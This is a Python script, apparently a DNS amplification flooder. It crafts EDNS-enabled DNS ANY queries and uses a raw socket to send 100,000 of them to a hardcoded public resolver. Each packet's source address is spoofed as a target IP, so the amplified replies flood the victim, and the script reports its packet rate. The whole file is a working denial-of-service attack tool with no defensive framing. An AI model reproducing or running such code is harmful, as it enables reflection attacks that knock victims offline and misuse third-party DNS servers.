import socket
from pinject import UDP, IP
from random import randint
import struct
import time
import sys


def a2b(ascii_str):  # ascii to binary
    return ascii_str.encode('ascii')


def b2a(bin_string):  # binary to ascii
    return bin_string.decode('ascii', 'replace')


def getQName(domain):
    """
    QNAME A domain name represented as a sequence of labels
    where each label consists of a length
    octet followed by that number of octets
    """
    labels = domain.split('.')
    QName = b''
    for label in labels:
        if len(label):
            QName += struct.pack('B', len(label)) + a2b(label)
    return QName

def getDnsQuery(domain):
    PAYLOAD = b'aaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01bbb\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00'

    id = struct.pack('H', randint(0, 65535))
    QName = getQName(domain)

    payload_return = PAYLOAD
    payload_return = payload_return.replace(b'aaa', id)
    payload_return = payload_return.replace(b'bbb', QName)
    return payload_return



print(sys.version)
target = '192.168.1.142'

resolver = '88.205.225.242'

# sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW)

PNUM = 100000

start_time = time.time()

for i in range(PNUM):
    payload = getDnsQuery('abc.com')
    udp = UDP(randint(1, 65535), 53, payload).pack(target, resolver)
    ip = IP(target, resolver, udp, proto=socket.IPPROTO_UDP).pack()
    x = sock.sendto(ip + udp + payload, (resolver, 53))

    # print(x)
end_time = time.time()

total_time = end_time - start_time
pps = PNUM / total_time
print("%s packets was sent, pps is %s, run time is %s" % (PNUM, pps, total_time))
